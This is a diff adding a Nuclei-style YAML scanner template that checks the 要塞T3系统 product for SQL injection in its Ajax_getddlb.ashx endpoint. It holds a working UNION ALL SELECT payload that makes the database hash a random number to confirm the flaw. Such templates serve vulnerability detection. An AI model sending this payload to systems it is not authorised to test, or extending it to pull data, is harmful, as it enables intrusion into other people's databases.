@@ -1,0 +1,38 @@
+id: poc-yaml-fort-t3-system-ajax-getddlb-sqli
+info:
+  name: 要塞T3系统 Ajax_getddlb SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Exploits an SQL Injection vulnerability in the 要塞T3系统 via the Ajax_getddlb endpoint.
+
+variables:
+  t1: "{{rand_int(1000,10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /T3/Ajax/Ajax_getddlb.ashx?typecode=11%27%20UNION%20ALL%20SELECT%20NULL%2C%28SELECT%20sys.fn_varbintohexstr%28hashbytes%28'MD5','{{t1}}'%29%29%29--%20aEdt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "请选择"
+          - "option"
+      - type: regex
+        part: body
+        regex:
+          - "0x{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "<html>"
+        negative: true
